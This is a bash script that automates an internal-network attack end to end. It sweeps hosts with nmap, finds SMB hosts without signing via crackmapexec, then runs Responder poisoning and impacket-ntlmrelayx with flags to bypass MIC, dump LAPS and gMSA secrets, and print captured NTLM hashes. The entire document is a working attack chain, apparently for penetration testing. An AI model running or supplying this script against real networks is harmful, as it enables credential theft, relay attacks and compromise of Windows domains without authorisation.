#!/bin/bash

IP=$(ip addr show eth0 | grep "inet " | cut -d '/' -f1 | cut -d ' ' -f6)
echo '! > OwnIP eth0: '$IP

echo '! > Network to scan in /root/ipint.txt for nmap'

if [ -s /root/ipint.txt ]; then
    echo "! >ipint.txt exists."
else 
    echo "! > ipint.txt does not exist or is empty."
	exit 1
fi

if [[ -d /root/output/nmap && -d /root/output/list ]]; then
    echo '! > Folder exists!'
else    
    #Creating Output Folders
    mkdir -p /root/output/nmap /root/output/list
fi

#NMAP PE SCAN
if [ -s /root/output/list/ipup.txt ]; then
echo '! > nmap PE already done'
else
   echo '! > NMAP PE Scan    FAST'
   nmap -PE -sn -n --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/pe -iL /root/ipint.txt > /dev/null 2>&1
   echo ''
   echo '! >> Done'

   #Piping the IP-Addresses of the Targets to a file
   awk '/Up/ {print$2}' /root/output/nmap/pe.gnmap > /root/output/list/ipup.txt
   echo ''
fi

if [ -s /root/output/list/smb_open.txt ]; then
   echo '! > SMB Open File already exists, CME is next!'
else
   #NMAP Portscan for port 445
   echo '! > NMAP Portscan 445'
   nmap -p 445 --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/445 -iL /root/output/list/ipup.txt > /dev/null 2>&1
   echo ''
   echo '! >> Done'

   #Piping IP's with 445 open to a file
   awk '/open/ {print$2}' /root/output/nmap/445.gnmap > /root/output/list/smb_open.txt
   echo ''
fi

if [ -s /root/output/list/smb_sign_off.txt ]; then
   echo '! > SMB Signing List already exist, Responder and NTLMRELAY are next!'
else
   #Using Crackmap to Check which of the IP's with 445 open have Signing:false
   echo '! > Generating Relay List'
   crackmapexec smb /root/output/list/smb_open.txt --gen-relay-list /root/output/list/smb_sign_off.txt > /root/output/cme_beauty.txt
   echo '! >> Done'
fi

#When Clients with Signing:false exist
if [ -s /root/output/list/smb_sign_off.txt ] 
	then
	echo ''
	
	#Responder with 300sec timeout in bg
	echo '! > Starting Responder'
	timeout 300 responder -I eth0 -rdwv > /dev/null 2>&1 &
	echo ''
	echo '! >> Done'
	echo ''

	#NTLMRelayX with 300sec timeout in bg to relay ntlm to hosts without signing enabled
	echo '! > Starting NTLM-Relay'
	timeout 300 impacket-ntlmrelayx -ip $IP -6 -ts -ra --dump-laps --dump-gmsa -l loot -of /root/output/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt > /dev/null 2>&1 &
	echo ''

	#Declaring variables for each PID of Responder and NTLMRelayX
	echo '! >> Waiting for Hashes'

	PID_RESPONDER=`jobs -l | awk '/responder/ {print$2}'`
	PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`

	#Waiting for Jobs to despawn
	wait $PID_RESPONDER
	wait $PID_RELAY
	
	#When Output-File exists and is not empty
	if [ -s /root/output/ntlm_relay_ntlmv2.txt ]
		then
		#Show me 'dem Hashes
		cat /root/output/ntlm_relay_ntlmv2.txt

		else
		echo '! >> No Hashes Found'
	fi
else
	echo '! > Either Signing is ON everywhere or no SMB Service available.'
fi


